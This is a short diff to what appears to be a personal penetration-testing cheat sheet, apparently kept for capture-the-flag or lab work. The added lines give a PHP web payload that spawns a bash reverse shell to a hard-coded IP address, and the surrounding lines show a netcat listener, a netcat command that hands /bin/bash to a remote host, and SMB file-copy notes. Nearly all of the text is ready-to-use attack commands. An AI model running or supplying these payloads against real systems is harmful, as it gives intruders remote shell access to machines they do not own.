@@ -118,6 +118,10 @@ File Transfer
       - files is a name that should be the same as the current directory
       - example: xcopy \\10.10.10.14\files\filename.exe
 
+Revrse Shell
+  Link: https://blog.barradell-johns.com/index.php/2018/12/30/reverse-shell-cheat-sheet/
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.123/5678 0>&1'"); ?>
+  
 NetCat
   Listener: nc -lvnp 5555
   NC Bash: nc 10.10.14.171 5555 -e /bin/bash
